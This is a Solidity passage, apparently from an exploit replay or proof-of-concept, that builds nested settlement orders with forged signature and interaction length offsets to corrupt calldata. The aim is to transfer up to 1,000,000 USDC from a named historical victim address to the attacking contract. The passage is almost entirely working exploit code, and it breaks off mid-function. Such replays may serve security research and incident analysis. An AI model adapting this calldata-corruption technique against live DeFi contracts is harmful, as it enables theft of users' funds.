    function _tryReplayCalldataCorruption() internal {
        if (replayMaker == address(0) || replayMakerAsset == address(0)) return;
        uint256 victimUsdcBalance = _safeBalanceOf(USDC, HISTORICAL_VICTIM);
        uint256 amountToSteal = _min(victimUsdcBalance, 1_000_000e6);
        if (amountToSteal == 0) return;
        uint256 fakeSignatureLengthOffset = 0x240;
        uint256 fakeInteractionLengthOffset = 0x460;
        bytes memory zeroBytes = new bytes(fakeInteractionLengthOffset - fakeSignatureLengthOffset);
        uint256 fakeInteractionLength = type(uint256).max - 0x1ff; // 0x...fe00
        bytes memory signature = bytes("");

        bytes memory interaction5;
        {
            IOrderMixinLike.Order memory sixthOrder = IOrderMixinLike.Order({
                salt: 0,
                makerAsset: replayMakerAsset,
                takerAsset: USDC,
                maker: replayMaker,
                receiver: address(this),
                allowedSender: SETTLEMENT,
                makingAmount: 1,
                takingAmount: amountToSteal,
                offsets: 0,
                interactions: hex""
            });

            bytes memory dynamicSuffix = abi.encode(
                uint256(0),
                HISTORICAL_VICTIM,
                USDC,
                uint256(0),
                uint256(0),
                USDC,
                amountToSteal,
                uint256(0x40)
            );

            bytes memory finalOrderInteraction = abi.encodePacked(
                SETTLEMENT,
                bytes1(0x01),
                HISTORICAL_VICTIM,
                new bytes(23),
                dynamicSuffix
            );

            interaction5 = abi.encodePacked(
                SETTLEMENT,
                bytes1(0x00),
                abi.encode(
                    sixthOrder,
                    fakeSignatureLengthOffset,
                    fakeInteractionLengthOffset,
                    uint256(0),
                    amountToSteal,
                    uint256(0),
                    address(this)
                ),
                zeroBytes,
                fakeInteractionLength,
                finalOrderInteraction
            );
        }

        IOrderMixinLike.Order memory fifthOrder = _buildReplayOrder(0, 1);
        bytes memory interaction4 = abi.encodePacked(
            SETTLEMENT,
            bytes1(0x00),
            abi.encode(fifthOrder, signature, interaction5, uint256(0), uint256(1), uint256(0), address(this))
        );

        IOrderMixinLike.Order memory fourthOrder = _buildReplayOrder(1, 1);
        bytes memory interaction3 = abi.encodePacked(
            SETTLEMENT,
            bytes1(0x00),
            abi.encode(fourthOrder, signature, interaction4, uint256(0), uint256(1), uint256(0), address(this))
        );

        IOrderMixinLike.Order memory thirdOrder = _buildReplayOrder(2, 1);
        bytes memory interaction2 = abi.encodePacked(
            SETTLEMENT,
            bytes1(0x00),
            abi.encode(thirdOrder, signature, interaction3, uint256(0), uint256(1), uint256(0), address(this))
        );

